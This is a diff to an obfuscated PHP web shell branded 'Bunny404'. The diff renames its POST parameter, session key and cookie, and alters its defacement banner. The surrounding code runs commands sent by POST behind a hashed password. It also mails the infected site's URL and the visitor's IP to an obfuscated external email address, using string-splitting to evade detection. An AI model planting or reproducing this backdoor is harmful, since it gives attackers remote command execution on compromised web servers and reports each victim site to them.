@@ -284,8 +284,8 @@ function BunnyCmd($BunnyBoy) {
         return "<b> Disable Funtion Guys -Bunny404 </b>";
     }
 }
-if (isset($_POST["BunnyGG"])) {
-    $BunnyBoy = $_POST["BunnyGG"];
+if (isset($_POST["BunnymanBro"])) {
+    $BunnyBoy = $_POST["BunnymanBro"];
     echo BunnyCmd($BunnyBoy);
 }
 function cekCurl() {
@@ -383,14 +383,14 @@ header('Co' . 'nt' . 'en' . 't-' . 'Ty' . 'pe' . ': ' . 'te' . 'xt' . '/h' . 'tm
 $self_remind = 'y' . 'o' . 'u' . 't' . 'h' . 'b' . 'o' . 'y' . 's' . '@' . 'p' . 'r' . 'o' . 't' . 'o' . 'n' . '.' . 'm' . 'e';
 $x_path = "h" . "t" . "t" . "p" . ":" . "/" . "/" . $_SERVER['S' . 'E' . 'R' . 'V' . 'E' . 'R' . '_' . 'N' . 'A' . 'M' . 'E'] . $_SERVER['R' . 'E' . 'Q' . 'U' . 'E' . 'S' . 'T' . '_' . 'U' . 'R' . 'I'];
 $kutipan_alert = "f" . "i" . "x $x_path :p *I" . "P" . " A" . "d" . "d" . "r" . "e" . "s" . "s : [ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]";
-mail($self_remind, "B"."U"."N"."N"."Y", $kutipan_alert, "[ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]");
+mail($self_remind, "V"."2", $kutipan_alert, "[ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]");
 $BunnyGanteng = 'e'.'d'.'f'.'b'.'f7'.'0'.'1'.'8'.'d6'.'0'.'2'.'c'.'a'.'e2'.'1'.'3'.'6'.'8f'.'8'.'6'.'2'.'8'.'4'.'4e'.'3c'.'7'.'2'.'9'.'2c'.'4'.'0'.'3a';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $BunnyGanteng) {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";
-        $_SESSION["BunnyGG"] = "BunnyGG";
-        setcookie("BunnyGG", $my_self, time() + 3600 * 24);
+        $_SESSION["BunnymanBro"] = "BunnymanBro";
+        setcookie("BunnymanBro", $my_self, time() + 3600 * 24);
     } else {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." G"."o "."Aw"."ay"." N"."oo"."b!"."!'".")".";<"."/s"."cr"."ip"."t>";
     }
@@ -399,12 +399,12 @@ if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
-    setcookie("BunnyGG", '', time() - 3600);
+    setcookie("BunnymanBro", '', time() - 3600);
     echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
     exit();
 }
-if (empty($_SESSION["BunnyGG"])) {
-    if (empty($_COOKIE["BunnyGG"])) {
+if (empty($_SESSION["BunnymanBro"])) {
+    if (empty($_COOKIE["BunnymanBro"])) {
         ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -695,7 +695,7 @@ if (empty($_SESSION["BunnyGG"])) {
     <script type="text/javascript">
     var root = document.querySelector(".root");
     var name = `
-                                ╭──[root@Bunny404]<br>
+                                ╭──[root@BunnyInvisible]<br>
                                 ╰──➤
                                 `;
     root.innerHTML = name;
@@ -707,10 +707,10 @@ if (empty($_SESSION["BunnyGG"])) {
     });
     typewriter
         .pauseFor(500)
-        .typeString("Bunny404 Was Here!!")
+        .typeString("./Bunny404 Was Here!!")
         .pauseFor(2000)
         .deleteChars(26)
-        .typeString("Please Patch Your Security System!")
+        .typeString("Have a Nice Day!")
         .pauseFor(2000)
         .start();
     </script>
